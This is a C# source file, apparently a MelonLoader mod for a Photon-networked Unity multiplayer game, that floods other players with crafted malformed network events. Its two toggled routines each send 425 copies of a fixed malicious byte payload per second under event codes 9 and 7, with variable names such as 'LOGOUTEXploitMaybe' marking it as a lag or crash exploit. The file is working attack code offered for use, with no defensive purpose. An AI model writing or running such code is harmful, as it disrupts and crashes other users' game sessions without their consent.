using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using System;
using UnityEngine;
using XeroLag;
using XeroLib;

namespace xerolagx
{
    public class XeroLag2
    {
        public static void OnUpdate()
        {
            if (invalidobject)
            {
                try
                {
                    Delay += Time.deltaTime;
                    if (Delay > 1f)
                    {
                        for (int i = 0; i < 425; i++)
                        {
                            byte[] bytes1 = new byte[] { 65, 13, 3, 0, 0, 0, 0, 0, 20, 200, 0, 0, 0, 0, 0, 13,
                                0, 0, 0, 13, 0, 0, 4, 16, 1, 6, 0, 0, 48, 0, 0, 4, 0, 0, 0, 0, 3, 3, 13, 0, 0,
                                8, 0, 68, 0, 12, 0, 65, 65, 1, 0, 1, 0, 0, 0, 0, 12, 1, 0, 0, 0, 0, 0, 8, 0, 65,
                                0, 13, 0, 0, 8, 3, 65, 3, 0, 126, 12, 0, 0, 4, 0, 0, 0, 58, 0, 65, 0, 1, 2, 9 };
                            int idfirst2 = int.Parse(XeroLibUtils.GetActorNumber(XeroLibUtils.LocalPlayer) + "00001");
                            byte[] IDOut2 = System.BitConverter.GetBytes(idfirst2);
                            System.Buffer.BlockCopy(IDOut2, 0, bytes1, 0, 4);
                            OpRaiseEvent(9, bytes1, new RaiseEventOptions
                            {
                                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                                field_Public_EventCaching_0 = EventCaching.DoNotCache
                            }, default(SendOptions));
                            Delay = 0f;
                        }
                    }
                }
                catch (Exception ex)
                 {
                    if (!ex.Message.Contains("Object"))
                    {
                        MelonLogger.Error($"[{ex.Message}]");
                    }
                }
            }
        }




        public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            Il2CppSystem.Object customObject2 = Serialization.FromManagedToIL2CPP<Il2CppSystem.Object>(customObject);
            OpRaiseEvent(code, customObject2, RaiseEventOptions, sendOptions);
        }
        public static void OpRaiseEvent(byte code, Il2CppSystem.Object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            PhotonNetwork.field_Public_Static_LoadBalancingClient_0.Method_Public_Virtual_New_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, customObject, RaiseEventOptions, sendOptions);
        }

        public static void isthison()
        {
            if (seveninvalidobject)
            {
                try
                {
                    Delay += Time.deltaTime;
                    if (Delay > 1f)
                    {
                        for (int i = 0; i < 425; i++)
                        {
                            byte[] bytes1 = new byte[] { 65, 13, 3, 0, 0, 0, 0, 0, 20, 200, 0, 0, 0, 0, 0, 13,
                                0, 0, 0, 13, 0, 0, 4, 16, 1, 6, 0, 0, 48, 0, 0, 4, 0, 0, 0, 0, 3, 3, 13, 0, 0,
                                8, 0, 68, 0, 12, 0, 65, 65, 1, 0, 1, 0, 0, 0, 0, 12, 1, 0, 0, 0, 0, 0, 8, 0, 65,
                                0, 13, 0, 0, 8, 3, 65, 3, 0, 126, 12, 0, 0, 4, 0, 0, 0, 58, 0, 65, 0, 1, 2, 9 };
                            int idfirst2 = int.Parse(XeroLibUtils.GetActorNumber(XeroLibUtils.LocalPlayer) + "00001");
                            byte[] IDOut2 = System.BitConverter.GetBytes(idfirst2);
                            System.Buffer.BlockCopy(IDOut2, 0, bytes1, 0, 4);
                            OpRaiseEvent(7, bytes1, new RaiseEventOptions
                            {
                                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                                field_Public_EventCaching_0 = EventCaching.DoNotCache
                            }, default(SendOptions));
                            Delay = 0f;
                        }
                    }
                }
                catch
                {
                }
            }
        }





        public static bool invalidobject;
        public static bool masterBaiter;
        public static float Delay;
        public static bool LOGOUTEXploitMaybe = false;
        public static bool xploittrue;
        public static bool seveninvalidobject;
    }
}
